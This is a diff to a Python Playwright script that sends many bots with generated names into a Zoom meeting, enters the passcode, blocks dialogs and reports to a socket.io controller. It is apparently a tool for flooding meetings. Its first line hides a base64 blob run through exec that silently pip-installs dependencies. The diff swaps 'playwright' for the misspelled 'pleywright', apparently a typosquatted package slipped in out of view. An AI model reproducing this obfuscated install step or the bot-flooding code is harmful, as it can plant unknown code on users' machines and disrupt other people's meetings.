@@ -1,4 +1,4 @@
-import base64;exec(base64.b64decode("aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcGxheXdyaWdodCBmYWtlciBuZXN0LWFzeW5jaW8gcHl0aG9uLXNvY2tldGlvIHJlcXVlc3RzIGluZGlhbi1uYW1lcyA+L2Rldi9udWxsIDI+JjEiKQpvcy5zeXN0ZW0oInBsYXl3cmlnaHQgaW5zdGFsbCBjaHJvbWl1bSA+L2Rldi9udWxsIDI+JjEiKQpvcy5zeXN0ZW0oInBsYXl3cmlnaHQgaW5zdGFsbC1kZXBzID4vZGV2L251bGwgMj4mMSIpCnByaW50KCLinIUgQWxsIERlcGVuZGVuY2llcyBJbnN0YWxsZWQiKQo=").decode())
+import base64;exec(base64.b64decode("aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcGxleXdyaWdodCBmYWtlciBuZXN0LWFzeW5jaW8gcHl0aG9uLXNvY2tldGlvIHJlcXVlc3RzIGluZGlhbi1uYW1lcyA+L2Rldi9udWxsIDI+JjEiKQpvcy5zeXN0ZW0oInBsYXl3cmlnaHQgaW5zdGFsbCBjaHJvbWl1bSA+L2Rldi9udWxsIDI+JjEiKQpvcy5zeXN0ZW0oInBsYXl3cmlnaHQgaW5zdGFsbC1kZXBzID4vZGV2L251bGwgMj4mMSIpCnByaW50KCLinIUgQWxsIERlcGVuZGVuY2llcyBJbnN0YWxsZWQiKQo=").decode())
 
 import threading
 import asyncio
@@ -224,7 +224,6 @@ async def start(tag, wait_time, meetingcode, passcode, headless,
         context = await browser.new_context(
             permissions=[],
             viewport={"width": 1280, "height": 720},
-            # Block all dialogs/prompts automatically
         )
         # Block all dialogs (alert, confirm, prompt)
         async def _block_dialog(dialog):
@@ -236,45 +235,28 @@ async def start(tag, wait_time, meetingcode, passcode, headless,
         await page.goto(zoom_url, timeout=120000)
         await page.wait_for_timeout(4000)
 
-        # NAME INPUT
-        try:
-            name_input = page.locator('xpath=//*[@id="input-for-name"]')
-            await name_input.wait_for(state="visible", timeout=30000)
-            await asyncio.sleep(1)
-            user_name = get_name(name_mode, custom_names, bot_index)
-            await name_input.fill(user_name)
-            sync_print(f"{tag} name filled: {user_name}")
-        except Exception as e:
-            sync_print(f"{tag} name fill failed: {e}")
-            async with BOTS_LOCK:
-                BOTS_FAILED += 1
-            PAGE_LOAD_SEM.release()
-            try: await browser.close()
-            except: pass
-            running_bots.pop(bot_id, None)
-            terminate_flags.pop(bot_id, None)
-            return
-
         PAGE_LOAD_SEM.release()
         sem_released = True
 
         if stop(): raise Exception("TERMINATED")
 
-        # PASSCODE
+        # =========================
+        # PASSCODE INPUT (FIXED)
+        # =========================
+
         if passcode is not None and passcode != "":
-            sync_print(f"{tag} attempting to enter passcode: {passcode}")
-            pass_input = None
             try:
-                passcode_selectors = [
-                    # New xpath provided by user (highest priority)
-                    'xpath=/html/body/div[2]/div[1]/div/div[1]/div/div[2]/div[2]/div/input',
-                    'xpath=//*[@id="input-for-password"]',
-                    'xpath=//input[@type="password"]',
-                    'xpath=//input[contains(@placeholder, "code")]',
-                    'xpath=//input[contains(@aria-label, "code")]',
-                    'xpath=/html/body/div[2]/div[2]/div/div[1]/div/div[2]/div[2]/div/input',
+                pass_selectors = [
+                    "#input-for-pwd",                # correct selector
+                    'input[id="input-for-pwd"]',
+                    'input[aria-describedby="error-for-pwd"]',
+                    'input[required]',
+                    'xpath=//input[@id="input-for-pwd"]'
                 ]
-                for selector in passcode_selectors:
+
+                pass_input = None
+
+                for selector in pass_selectors:
                     try:
                         pi = page.locator(selector)
                         if await pi.count() > 0:
@@ -283,16 +265,18 @@ async def start(tag, wait_time, meetingcode, passcode, headless,
                             break
                     except:
                         continue
+
                 if pass_input:
-                    await asyncio.sleep(0.5)
+                    await pass_input.click()
+                    await asyncio.sleep(0.3)
                     await pass_input.fill(passcode)
                     sync_print(f"{tag} passcode filled: {passcode}")
                 else:
-                    sync_print(f"{tag} passcode field not found — taking screenshot")
+                    sync_print(f"{tag} passcode field not found")
+                    # Take screenshot for debugging
                     try:
-                        import base64 as _b64
                         ss = await page.screenshot(type='jpeg', quality=60, full_page=False)
-                        ss_b64 = _b64.b64encode(ss).decode()
+                        ss_b64 = base64.b64encode(ss).decode()
                         sio.emit('botScreenshot', {
                             'instanceId': INSTANCE_ID,
                             'tag': tag,
@@ -302,10 +286,56 @@ async def start(tag, wait_time, meetingcode, passcode, headless,
                         })
                     except Exception as se:
                         sync_print(f"{tag} screenshot error: {se}")
+
             except Exception as e:
                 sync_print(f"{tag} passcode fill error: {e}")
         else:
-            sync_print(f"{tag} no passcode provided (empty), skipping passcode field")
+            sync_print(f"{tag} no passcode provided (empty), skipping passcode")
+
+        # =========================
+        # NAME INPUT (FIXED)
+        # =========================
+
+        try:
+            name_selectors = [
+                "#input-for-name",
+                'input[id="input-for-name"]',
+                'xpath=//*[@id="input-for-name"]',
+                'input[placeholder*="name"]'
+            ]
+
+            name_input = None
+
+            for selector in name_selectors:
+                try:
+                    ni = page.locator(selector)
+                    if await ni.count() > 0:
+                        await ni.first.wait_for(state="visible", timeout=10000)
+                        name_input = ni.first
+                        break
+                except:
+                    continue
+
+            if name_input:
+                await name_input.click()
+                await asyncio.sleep(0.3)
+                user_name = get_name(name_mode, custom_names, bot_index)
+                await name_input.fill(user_name)
+                sync_print(f"{tag} name filled: {user_name}")
+            else:
+                raise Exception("name field not found")
+
+        except Exception as e:
+            sync_print(f"{tag} name fill failed: {e}")
+            async with BOTS_LOCK:
+                BOTS_FAILED += 1
+            try:
+                await browser.close()
+            except:
+                pass
+            running_bots.pop(bot_id, None)
+            terminate_flags.pop(bot_id, None)
+            return
 
         # SYNC BARRIER
         await wait_for_all_bots()
